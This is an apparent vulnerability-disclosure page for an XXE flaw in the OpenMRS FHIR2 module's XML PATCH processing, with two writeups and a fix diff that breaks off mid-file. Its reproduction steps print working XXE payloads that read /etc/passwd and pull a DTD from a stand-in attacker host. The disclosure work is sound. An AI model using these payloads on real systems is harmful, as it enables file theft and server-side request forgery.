@@ -1,0 +1,611 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-CVX8213H · openmrs/openmrs-module-fhir2</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-CVX8213H · openmrs/openmrs-module-fhir2</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  xxe
+  <span class="sev-badge sev-high">high</span>
+</h2>
+
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-unknown">-</span></span>
+</p>
+
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Ophion Security.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-CVX8213H: XXE injection via XML patch processing in third-party library</h1>
+<p>HTTP PATCH requests with Content-Type application/xml-patch+xml flow from the FHIR resource provider through BaseFhirService.patch() (lines 185-186, PatchTypeEnum.XML_PATCH) into XmlPatchUtils.applyXmlPatch(), which hands the raw body to com.github.dnault:xml-patch:0.3.1's Patcher.patch(). That library instantiates DocumentBuilderFactory with default settings and never disables DTDs or external entities, and no upstream filter strips DOCTYPE declarations. An authenticated attacker can therefore embed an external entity (file:// or http://) in the patch XML and have it resolved server-side. The resolved content is written into the patched FHIR resource and reflected back in the response or error, yielding arbitrary file read and SSRF.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> <a href="https://github.com/openmrs/openmrs-module-fhir2">openmrs/openmrs-module-fhir2</a><br>
+<strong>Commit:</strong> <code>59474d3db4b93f7f</code><br>
+<strong>Version:</strong> master @ 5a0535de2556 (as of 2026-04-17)<br>
+<strong>Location:</strong> <code>XmlPatchUtils.java:43</code><br>
+<strong>Discovery:</strong> static analysis — not yet dynamically reproduced  </p>
+<h2>Technical Details</h2>
+<p>The root cause is that applyXmlPatch() delegates parsing of untrusted XML to a third-party library (xml-patch 0.3.1) that calls DocumentBuilderFactory.newInstance() without setFeature() calls to disable external-general-entities, external-parameter-entities, or DOCTYPE declarations. Because no code path sanitizes or rejects DOCTYPE/ENTITY constructs before parsing, any SYSTEM entity in the patch body is resolved by the server's XML parser.</p>
+<h2>Reproduction</h2>
+<ol>
+<li>Authenticate to the OpenMRS FHIR2 endpoint.</li>
+<li>Send PATCH /ws/fhir2/R4/Patient/{id} with Content-Type: application/xml-patch+xml.</li>
+<li>Supply body: &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&amp;xxe;.</li>
+<li>The xml-patch parser resolves &amp;xxe; and injects the file contents into the patched resource.</li>
+<li>Read the exfiltrated data from the FHIR response body or error message; substitute http(s):// URIs for SSRF.</li>
+</ol>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Suggested Fix</h2>
+<p>Disable external entity resolution and DTD processing on the DocumentBuilderFactory used for patch parsing (set disallow-doctype-decl=true, external-general-entities=false, external-parameter-entities=false, XInclude=false), or pre-process the patch body to reject/strip DOCTYPE declarations before calling Patcher.patch().</p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-CVX8213H.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-CVX8213H<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Ophion Security. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-high">high</dd></dl>
+<div class="report-body" tabindex="0"><h1>[OpenMRS FHIR2 Module]: XXE injection via XML patch processing in third-party library</h1>
+<p><strong>Product:OpenMRS FHIR2 Module</strong>
+<strong>Tested on:4.0.0-Snapshot</strong></p>
+<p>CVSS3.1: <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</code></p>
+<h2>CVSS Reasoning</h2>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Value</th>
+<th>Response</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Attack Vector</td>
+<td>Network (N)</td>
+<td>Exploited via crafted XML submitted to the application over the network — no local or adjacent access required.</td>
+</tr>
+<tr>
+<td>Attack Complexity</td>
+<td>Low (L)</td>
+<td>Standard XXE payloads work without special conditions, timing windows, or environmental prep. The attacker controls XML input directly.</td>
+</tr>
+<tr>
+<td>Privilege Required</td>
+<td>Low (L)</td>
+<td>Requires an authenticated user account with <code>Get Patient</code> and <code>Update Patient</code> privilege — no admin role needed.</td>
+</tr>
+<tr>
+<td>User Interaction</td>
+<td>None (N)</td>
+<td>Attacker submits the payload directly; no victim action required.</td>
+</tr>
+<tr>
+<td>Scope</td>
+<td>Unchanged (U)</td>
+<td>The vulnerability and its impact are contained within the vulnerable application's security authority. While deployment context (e.g., cloud environments with metadata services, internal network reachability) can amplify real-world impact, those are environmental factors scored separately via the Environmental metric group, not the Base score.</td>
+</tr>
+<tr>
+<td>Confidentiality</td>
+<td>High (H)</td>
+<td>OOB exfiltration combined with file read provides the attacker access to arbitrary readable files within the application's context, including configuration files, secrets, and any data the application process can access. Total loss of confidentiality for in-scope resources.</td>
+</tr>
+<tr>
+<td>Integrity</td>
+<td>None (N)</td>
+<td>Vulnerability as described enables data disclosure only, not modification.</td>
+</tr>
+<tr>
+<td>Availability</td>
+<td>None (N)</td>
+<td>No denial-of-service component in the described attack.</td>
+</tr>
+</tbody>
+</table>
+<h2>Summary</h2>
+<p>The FHIR2 module's XML PATCH handling passes untrusted XML directly to the <code>com.github.dnault:xml-patch:0.3.1</code> library, which parses it using a <code>DocumentBuilderFactory</code> with default settings that do not disable external entity resolution or DTD processing. An authenticated attacker can submit a crafted XML patch body containing a DTD with external entity references, potentially achieving arbitrary file read from the server filesystem or Server-Side Request Forgery (SSRF). This finding is based on static analysis and has not been dynamically reproduced.</p>
+<h2>Impact</h2>
+<p>An authenticated user with access to the FHIR PATCH endpoint could read arbitrary files from the server filesystem (e.g., <code>/etc/passwd</code>, application configuration files containing database credentials, cloud URLs such as AWS metadata on OpenMRS deployed via AWS) through out-of-bound requests or creating expected error messages.</p>
+<h2>Description</h2>
+<p>The vulnerability exists in the XML PATCH processing pipeline of the openmrs-module-fhir2 module.</p>
+<p><strong>Data flow:</strong></p>
+<ol>
+<li>An HTTP PATCH request with <code>Content-Type: application/xml-patch+xml</code> is received by a FHIR resource provider (e.g., <code>PatientFhirResourceProvider</code>).</li>
+<li>The request body is routed through <code>BaseFhirService.patch()</code> at lines 185–186, which dispatches <code>PatchTypeEnum.XML_PATCH</code> to <code>XmlPatchUtils.applyXmlPatch()</code>.</li>
+<li><code>XmlPatchUtils.applyXmlPatch()</code> at line 43 passes the raw, attacker-controlled XML body to the third-party library <code>com.github.dnault:xml-patch:0.3.1</code>'s <code>Patcher.patch()</code> method.</li>
+</ol>
+<p><strong>Vulnerable sink:</strong></p>
+<p>Inside <code>xml-patch:0.3.1</code>, <code>Patcher.patch()</code> instantiates a <code>DocumentBuilderFactory</code> using <code>DocumentBuilderFactory.newInstance()</code> with default settings. Java's default <code>DocumentBuilderFactory</code> does <strong>not</strong> disable:
+- External general entities (<code>http://xml.org/sax/features/external-general-entities</code>)
+- External parameter entities (<code>http://xml.org/sax/features/external-parameter-entities</code>)
+- DOCTYPE declarations (<code>http://apache.org/xml/features/disallow-doctype-decl</code>)</p>
+<pre tabindex="0"><code class="language-java">// BaseFhirService.java:185-186
+case XML_PATCH:
+    patchedResource = XmlPatchUtils.applyXmlPatch(dao, resourceId, patchBody);
+
+// XmlPatchUtils.java:43 — delegates to xml-patch library
+Patcher.patch(originalXml, patchXml);  // patchXml is attacker-controlled
+
+// Inside com.github.dnault:xml-patch:0.3.1 Patcher.patch():
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+// No setFeature() calls to disable external entities or DTDs
+DocumentBuilder db = dbf.newDocumentBuilder();
+Document doc = db.parse(inputSource);  // parses attacker-controlled XML
+</code></pre>
+<p>No upstream filter in the openmrs-module-fhir2 request processing pipeline strips or rejects DOCTYPE declarations before the XML reaches the parser.</p>
+<h2>Reproduction</h2>
+<ol>
+<li>Use the following bash script to create a limited user role and user for testing. </li>
+</ol>
+<pre tabindex="0"><code class="language-bash">#!/usr/bin/env bash
+set -euo pipefail
+
+BASE_URL=&quot;&quot;
+ADMIN_USER=&quot;&quot;
+ADMIN_PASS=&quot;&quot;
+NEW_USER=&quot;fhir_patient_writer&quot;
+NEW_PASS=&quot;ChangeMe123!&quot;
+ROLE_NAME=&quot;FHIR Patient Writer&quot;
+
+while [[ $# -gt 0 ]]; do
+  case &quot;$1&quot; in
+    --base-url) BASE_URL=&quot;$2&quot;; shift 2 ;;
+    --admin-user) ADMIN_USER=&quot;$2&quot;; shift 2 ;;
+    --admin-pass) ADMIN_PASS=&quot;$2&quot;; shift 2 ;;
+    --new-user) NEW_USER=&quot;$2&quot;; shift 2 ;;
+    --new-pass) NEW_PASS=&quot;$2&quot;; shift 2 ;;
+    --role-name) ROLE_NAME=&quot;$2&quot;; shift 2 ;;
+    *) echo &quot;Unknown arg: $1&quot;; exit 1 ;;
+  esac
+done
+
+[[ -z &quot;$BASE_URL&quot; || -z &quot;$ADMIN_USER&quot; || -z &quot;$ADMIN_PASS&quot; ]] &amp;&amp; {
+  echo &quot;Usage: $0 --base-url http://host/openmrs --admin-user admin --admin-pass Admin123 [--new-user fhir_patient_writer --new-pass 'Password123!']&quot;
+  exit 1
+}
+
+API=&quot;$BASE_URL/ws/rest/v1&quot;
+
+need() { command -v &quot;$1&quot; &gt;/dev/null || { echo &quot;Missing dependency: $1&quot;; exit 1; }; }
+need curl
+need jq
+
+auth=(-u &quot;$ADMIN_USER:$ADMIN_PASS&quot; -H &quot;Content-Type: application/json&quot; -H &quot;Accept: application/json&quot;)
+
+echo &quot;[*] Creating role: $ROLE_NAME&quot;
+
+ROLE_PAYLOAD=$(jq -n \
+  --arg name &quot;$ROLE_NAME&quot; \
+  --arg desc &quot;Can read and update existing patients through FHIR2&quot; \
+  '{
+    name: $name,
+    description: $desc,
+    privileges: [
+      {name:&quot;Get Patients&quot;},
+      {name:&quot;View Patients&quot;},
+      {name:&quot;Edit Patients&quot;},
+      {name:&quot;Edit Patient Identifiers&quot;}
+    ]
+  }')
+
+ROLE_RESP=$(curl -sS &quot;${auth[@]}&quot; -X POST &quot;$API/role&quot; -d &quot;$ROLE_PAYLOAD&quot; || true)
+
+ROLE_UUID=$(echo &quot;$ROLE_RESP&quot; | jq -r '.uuid // empty')
+
+if [[ -z &quot;$ROLE_UUID&quot; ]]; then
+  echo &quot;[*] Role may already exist, looking it up...&quot;
+  ROLE_UUID=$(curl -sS &quot;${auth[@]}&quot; &quot;$API/role?q=$(python3 -c &quot;import urllib.parse; print(urllib.parse.quote('$ROLE_NAME'))&quot;)&amp;v=full&quot; \
+    | jq -r --arg name &quot;$ROLE_NAME&quot; '.results[] | select(.name==$name or .display==$name) | .uuid' | head -n1)
+fi
+
+[[ -z &quot;$ROLE_UUID&quot; ]] &amp;&amp; {
+  echo &quot;Could not create/find role. Response was:&quot;
+  echo &quot;$ROLE_RESP&quot;
+  exit 1
+}
+
+echo &quot;[*] Role UUID: $ROLE_UUID&quot;
+echo &quot;[*] Creating user: $NEW_USER&quot;
+
+USER_PAYLOAD=$(jq -n \
+  --arg username &quot;$NEW_USER&quot; \
+  --arg password &quot;$NEW_PASS&quot; \
+  --arg role &quot;$ROLE_UUID&quot; \
+  '{
+    username: $username,
+    password: $password,
+    systemId: $username,
+    person: {
+      names: [{givenName:&quot;FHIR&quot;, familyName:&quot;Patient Writer&quot;}],
+      gender: &quot;O&quot;
+    },
+    roles: [$role]
+  }')
+
+USER_RESP=$(curl -sS &quot;${auth[@]}&quot; -X POST &quot;$API/user&quot; -d &quot;$USER_PAYLOAD&quot;)
+
+echo &quot;$USER_RESP&quot; | jq .
+
+echo
+echo &quot;FHIR Basic Auth user created:&quot;
+echo &quot;  username: $NEW_USER&quot;
+echo &quot;  password: $NEW_PASS&quot;
+echo
+echo &quot;Test:&quot;
+echo &quot;curl -u '$NEW_USER:$NEW_PASS' '$BASE_URL/ws/fhir2/R4/Patient/&lt;patient-uuid&gt;'&quot;
+</code></pre>
+<ol>
+<li>List available patients with the following Rest API call: http://$BASE_URL/ws/fhir2/R4/Patient</li>
+<li>Get the <code>UUID</code> of the patient from <code>resource.id</code> value.</li>
+<li>Host an exploit server with the following dtd file: </li>
+</ol>
+<pre tabindex="0"><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY sessionVariables &quot;placeholder&quot;&gt;
+&lt;!ENTITY autoReconnect &quot;placeholder&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;&quot;&gt;
+%eval;
+%error;
+</code></pre>
+<ol>
+<li>Send the following POST request to then retrieve the content of /etc/passwd: </li>
+</ol>
+<pre tabindex="0"><code>PATCH /openmrs/ws/fhir2/R4/Patient/PATIENT_UUID HTTP/1.1
+Host: localhost:8080
+Authorization: Basic Base64_username:password
+Content-Type: application/xml-patch+xml
+Connection: keep-alive
+Content-Length: 330
+
+&lt;!DOCTYPE data [
+  &lt;!ENTITY % remote SYSTEM &quot;http://MALICIOUS_DTD_HOST&quot;&gt;
+  %remote;
+]&gt;
+</code></pre>
+<ol>
+<li>The output will content the value of /etc/passwd</li>
+</ol>
+<h2>Remediation</h2>
+<p>In <code>XmlPatchUtils.applyXmlPatch()</code> (XmlPatchUtils.java), pre-parse or sanitize the incoming XML patch body before passing it to the xml-patch library. The most robust approach is to reject any input containing a DOCTYPE declaration, since legitimate XML patch documents have no need for DTDs:</p>
+<pre tabindex="0"><code class="language-java">// XmlPatchUtils.java — before calling Patcher.patch()
+if (patchBody.contains(&quot;&lt;!DOCTYPE&quot;) || patchBody.contains(&quot;&lt;!ENTITY&quot;)) {
+    throw new InvalidRequestException(&quot;XML patch body must not contain DOCTYPE declarations&quot;);
+}
+</code></pre>
+<p>Alternatively (and preferably), fork or wrap the xml-patch library call to use a securely configured <code>DocumentBuilderFactory</code>:</p>
+<pre tabindex="0"><code class="language-java">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
+dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
+dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
+dbf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);
+</code></pre>
+<h2>Internal Triage Note</h2>
+<p>-&gt; CVD Recommendation: Report. Valid XXE while it requires user with some permission, permissions are normal in most medical environment. </p>
+<p>-&gt; Anthropic discussion:</p></div>
+
+
+<div class="marker">UPSTREAM FIX</div>
+<p class="section-intro">The change that resolved this finding.</p>
+<div class="diff-block"><pre class="diff" tabindex="0"><code><span class="diff-h">diff --git a/api/pom.xml b/api/pom.xml</span>
+<span class="diff-h">index 22081cf9c1..0921b003d7 100644</span>
+<span class="diff-h">--- a/api/pom.xml</span>
+<span class="diff-h">+++ b/api/pom.xml</span>
+<span class="diff-h">@@ -60,10 +60,6 @@</span>
+<span class="diff-c"> 			&lt;groupId&gt;com.github.java-json-tools&lt;/groupId&gt;</span>
+<span class="diff-c"> 			&lt;artifactId&gt;json-patch&lt;/artifactId&gt;</span>
+<span class="diff-c"> 		&lt;/dependency&gt;</span>
+<span class="diff-d">-		&lt;dependency&gt;</span>
+<span class="diff-d">-			&lt;groupId&gt;com.github.dnault&lt;/groupId&gt;</span>
+<span class="diff-d">-			&lt;artifactId&gt;xml-patch&lt;/artifactId&gt;</span>
+<span class="diff-d">-		&lt;/dependency&gt;</span>
+<span class="diff-c"> 		&lt;dependency&gt;</span>
+<span class="diff-c"> 			&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span>
+<span class="diff-c"> 			&lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span>
+<span class="diff-h">diff --git a/api/src/main/java/org/openmrs/module/fhir2/api/util/XmlPatchUtils.java b/api/src/main/java/org/openmrs/module/fhir2/api/util/XmlPatchUtils.java</span>
+<span class="diff-h">index bacc2eb643..98cc22cfc3 100644</span>
+<span class="diff-h">--- a/api/src/main/java/org/openmrs/module/fhir2/api/util/XmlPatchUtils.java</span>
+<span class="diff-h">+++ b/api/src/main/java/org/openmrs/module/fhir2/api/util/XmlPatchUtils.java</span>
+<span class="diff-h">@@ -18,8 +18,9 @@</span>
+<span class="diff-c"> import ca.uhn.fhir.context.FhirContext;</span>
+<span class="diff-c"> import ca.uhn.fhir.rest.api.Constants;</span>
+<span class="diff-c"> import ca.uhn.fhir.rest.server.exceptions.InvalidRequestException;</span>
+<span class="diff-d">-import com.github.dnault.xmlpatch.Patcher;</span>
+<span class="diff-c"> import org.hl7.fhir.instance.model.api.IBaseResource;</span>
+<span class="diff-a">+import org.openmrs.module.fhir2.api.util.xmlpatch.XmlPatchException;</span>
+<span class="diff-a">+import org.openmrs.module.fhir2.api.util.xmlpatch.XmlPatcher;</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> public class XmlPatchUtils {</span>
+<span class="diff-c"> 	</span>
+<span class="diff-h">@@ -40,10 +41,10 @@ public static &lt;T extends IBaseResource&gt; T applyXmlPatch(FhirContext theCtx, T th</span>
+<span class="diff-c"> 		</span>
+<span class="diff-c"> 		ByteArrayOutputStream result = new ByteArrayOutputStream();</span>
+<span class="diff-c"> 		try {</span>
+<span class="diff-d">-			Patcher.patch(new ByteArrayInputStream(inputResource.getBytes(Constants.CHARSET_UTF8)),</span>
+<span class="diff-a">+			XmlPatcher.patch(new ByteArrayInputStream(inputResource.getBytes(Constants.CHARSET_UTF8)),</span>
+<span class="diff-c"> 			    new ByteArrayInputStream(thePatchBody.getBytes(Constants.CHARSET_UTF8)), result);</span>
+<span class="diff-c"> 		}</span>
+<span class="diff-d">-		catch (IOException e) {</span>
+<span class="diff-a">+		catch (IOException | XmlPatchException e) {</span>
+<span class="diff-c"> 			throw new InvalidRequestException(e);</span>
+<span class="diff-c"> 		}</span>
+<span class="diff-c"> 		</span>
+<span class="diff-h">diff --git a/api/src/main/java/org/openmrs/module/fhir2/api/util/xmlpatch/XmlPatchException.java b/api/src/main/java/org/openmrs/module/fhir2/api/util/xmlpatch/XmlPatchException.java</span>
+<span class="diff-c">new file mode 100644</span>
+<span class="diff-h">index 0000000000..034288f361</span>
+<span class="diff-h">--- /dev/null</span>
+<span class="diff-h">+++ b/api/src/main/java/org/openmrs/module/fhir2/api/util/xmlpatch/XmlPatchException.java</span>
+<span class="diff-h">@@ -0,0 +1,23 @@</span>
+<span class="diff-a">+/*</span>
+<span class="diff-a">+ * This Source Code Form is subject to the terms of the Mozilla Public License,</span>
+<span class="diff-a">+ * v. 2.0. If a copy of the MPL was not distributed with this file, You can</span>
+<span class="diff-a">+ * obtain one at http://mozilla.org/MPL/2.0/. OpenMRS is also distributed under</span>
+<span class="diff-a">+ * the terms of the Healthcare Disclaimer located at http://openmrs.org/license.</span>
+<span class="diff-a">+ *</span>
+<span class="diff-a">+ * Copyright (C) OpenMRS Inc. OpenMRS is a registered trademark and the OpenMRS</span>
+<span class="diff-a">+ * graphic logo is a trademark of OpenMRS Inc.</span>
+<span class="diff-a">+ */</span>
+<span class="diff-a">+package org.openmrs.module.fhir2.api.util.xmlpatch;</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+public class XmlPatchException extends RuntimeException {</span>
+<span class="diff-a">+	</span>
+<span class="diff-a">+	private static final long serialVersionUID = 1L;</span>
+<span class="diff-a">+	</span>
+<span class="diff-a">+	public XmlPatchException(String message) {</span>
+<span class="diff-a">+		super(message);</span>
+<span class="diff-a">+	}</span>
+<span class="diff-a">+	</span>
+<span class="diff-a">+	public XmlPatchException(String message, Throwable cause) {</span>
+<span class="diff-a">+		super(message, cause);</span>
+<span class="diff-a">+	}</span>
+<span class="diff-a">+}</span>
+<span class="diff-h">diff --git a/api/src/main/java/org/openmrs/module/fhir2/api/util/xmlpatch/XmlPatcher.java b/api/src/main/java/org/openmrs/module/fhir2/api/util/xmlpatch/XmlPatcher.java</span>
+<span class="diff-c">new file mode 100644</span>
+<span class="diff-h">index 0000000000..3db95214da</span>
+<span class="diff-h">--- /dev/null</span>
+<span class="diff-h">+++ b/api/src/main/java/org/openmrs/module/fhir2/api/util/xmlpatch/XmlPatcher.java</span>
+<span class="diff-h">@@ -0,0 +1,660 @@</span>
+<span class="diff-a">+/*</span>
+<span class="diff-a">+ * This Source Code Form is subject to the terms of the Mozilla Public License,</span>
+<span class="diff-a">+ * v. 2.0. If a copy of the MPL was not distributed with this file, You can</span>
+<span class="diff-a">+ * obtain one at http://mozilla.org/MPL/2.0/. OpenMRS is also distributed under</span>
+<span class="diff-a">+ * the terms of the Healthcare Disclaimer located at http://openmrs.org/license.</span>
+<span class="diff-a">+ *</span>
+<span class="diff-a">+ * Copyright (C) OpenMRS Inc. OpenMRS is a registered trademark and the OpenMRS</span>
+<span class="diff-a">+ * graphic logo is a trademark of OpenMRS Inc.</span>
+<span class="diff-a">+ */</span>
+<span class="diff-a">+package org.openmrs.module.fhir2.api.util.xmlpatch;</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+import javax.xml.XMLConstants;</span>
+<span class="diff-a">+import javax.xml.namespace.NamespaceContext;</span>
+<span class="diff-a">+import javax.xml.parsers.DocumentBuilder;</span>
+<span class="diff-a">+import javax.xml.parsers.DocumentBuilderFactory;</span>
+<span class="diff-a">+import javax.xml.parsers.ParserConfigurationException;</span>
+<span class="diff-a">+import javax.xml.transform.OutputKeys;</span>
+<span class="diff-a">+import javax.xml.transform.Transformer;</span>
+<span class="diff-a">+import javax.xml.transform.TransformerException;</span>
+<span class="diff-a">+import javax.xml.transform.TransformerFactory;</span>
+<span class="diff-a">+import javax.xml.transform.dom.DOMSource;</span>
+<span class="diff-a">+import javax.xml.transform.stream.StreamResult;</span>
+<span class="diff-a">+import javax.xml.xpath.XPath;</span>
+<span class="diff-a">+import javax.xml.xpath.XPathConstants;</span>
+<span class="diff-a">+import javax.xml.xpath.XPathExpressionException;</span>
+<span class="diff-a">+import javax.xml.xpath.XPathFactory;</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+import java.io.IOException;</span>
+<span class="diff-a">+import java.io.InputStream;</span>
+<span class="diff-a">+import java.io.OutputStream;</span>
+<span class="diff-a">+import java.util.ArrayList;</span>
+<span class="diff-a">+import java.util.Collections;</span>
+<span class="diff-a">+import java.util.Iterator;</span>
+<span class="diff-a">+import java.util.List;</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+import org.w3c.dom.Attr;</span>
+<span class="diff-a">+import org.w3c.dom.Document;</span>
+<span class="diff-a">+import org.w3c.dom.Element;</span>
+<span class="diff-a">+import org.w3c.dom.NamedNodeMap;</span>
+<span class="diff-a">+import org.w3c.dom.Node;</span>
+<span class="diff-a">+import org.w3c.dom.NodeList;</span>
+<span class="diff-a">+import org.w3c.dom.Text;</span>
+<span class="diff-a">+import org.xml.sax.InputSource;</span>
+<span class="diff-a">+import org.xml.sax.SAXException;</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+/**</span>
+<span class="diff-a">+ * Applies an XML PATCH document (RFC 5261) to an XML target. The selector grammar uses XPath 1.0</span>
+<span class="diff-a">+ * via {@link javax.xml.xpath.XPath}, with namespace prefixes resolved against the in-scope</span>
+<span class="diff-a">+ * declarations of each patch operation element.</span>
+<span class="diff-a">+ * &lt;p&gt;</span>
+<span class="diff-a">+ * As a non-RFC convenience inherited from the {@code com.github.dnault:xml-patch} library this</span>
+<span class="diff-a">+ * replaces, multi-line text content in patch operations is trimmed by default; this can be</span>
+<span class="diff-a">+ * overridden with {@code trim=&quot;true&quot;} or {@code trim=&quot;false&quot;} on the operation element.</span>
+<span class="diff-a">+ * &lt;/p&gt;</span>
+<span class="diff-a">+ */</span>
+<span class="diff-a">+public final class XmlPatcher {</span>
+<span class="diff-a">+	</span>
+<span class="diff-a">+	private static final String XMLNS_NS = &quot;http://www.w3.org/2000/xmlns/&quot;;</span>
+<span class="diff-a">+	</span>
+<span class="diff-a">+	private XmlPatcher() {</span>
+<span class="diff-a">+	}</span>
+<span class="diff-a">+	</span>
+<span class="diff-a">+	/**</span>
+<span class="diff-a">+	 * Applies the patch in {@code diff} to the document in {@code target}, writing the result to</span>
+<span class="diff-a">+	 * {@code out}. Streams are read but not closed by this method.</span>
+<span class="diff-a">+	 */</span>
+<span class="diff-a">+	public static void patch(InputStream target, InputStream diff, OutputStream out) throws IOException {</span>
+<span class="diff-a">+		Document targetDoc = parse(target);</span>
+<span class="diff-a">+		Document diffDoc = parse(diff);</span>
+<span class="diff-a">+		</span>
+<span class="diff-a">+		Element diffRoot = diffDoc.getDocumentElement();</span>
+<span class="diff-a">+		if (diffRoot == null) {</span>
+<span class="diff-a">+			throw new XmlPatchException(&quot;Patch document has no root element&quot;);</span>
+<span class="diff-a">+		}</span>
+<span class="diff-a">+		</span>
+<span class="diff-a">+		NodeList ops = diffRoot.getChildNodes();</span>
+<span class="diff-a">+		List&lt;Element&gt; opElements = new ArrayList&lt;&gt;();</span>
+<span class="diff-a">+		for (int i = 0; i &lt; ops.getLength(); i++) {</span>
+<span class="diff-a">+			Node n = ops.item(i);</span>
+<span class="diff-a">+			if (n.getNodeType() == Node.ELEMENT_NODE) {</span>
+<span class="diff-a">+				opElements.add((Element) n);</span>
+<span class="diff-a">+			}</span>
+<span class="diff-a">+		}</span>
+<span class="diff-a">+		</span>
+<span class="diff-a">+		for (Element op : opElements) {</span>
+<span class="diff-a">+			applyOperation(targetDoc, op);</span>
+<span class="diff-a">+		}</span>
+<span class="diff-a">+		</span>
+<span class="diff-a">+		write(targetDoc, out);</span>
+<span class="diff-a">+	}</span>
+<span class="diff-a">+	</span>
+<span class="diff-a">+	private static Document parse(InputStream in) throws IOException {</span>
+<span class="diff-a">+		try {</span>
+<span class="diff-a">+			DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span>
+<span class="diff-a">+			dbf.setNamespaceAware(true);</span>
+<span class="diff-a">+			dbf.setExpandEntityReferences(false);</span>
+<span class="diff-a">+			dbf.setXIncludeAware(false);</span>
+<span class="diff-a">+			dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</span>
+<span class="diff-a">+			dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span>
+<span class="diff-a">+			dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span>
+<span class="diff-a">+			dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span>
+<span class="diff-a">+			dbf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span>
+<span class="diff-a">+			DocumentBuilder builder = dbf.newDocumentBuilder();</span>
+<span class="diff-a">+			return builder.parse(new InputSource(in));</span>
+<span class="diff-a">+		}</span>
+<span class="diff-a">+		catch (ParserConfigurationException | SAXException e) {</span>
+<span class="diff-a">+			throw new XmlPatchException(&quot;Failed to parse XML: &quot; + e.getMessage(), e);</span>
+<span class="diff-a">+		}</span>
+<span class="diff-a">+	}</span>
+<span class="diff-a">+	</span>
+<span class="diff-a">+	private static void write(Document doc, OutputStream out) throws IOException {</span>
+<span class="diff-a">+		try {</span>
+<span class="diff-a">+			TransformerFactory tf = TransformerFactory.newInstance();</span>
+<span class="diff-a">+			tf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</span>
+<span class="diff-a">+			trySetAttribute(tf, XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span>
+<span class="diff-a">+			trySetAttribute(tf, XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;&quot;);</span>
+<span class="diff-a">+			Transformer t = tf.newTransformer();</span>
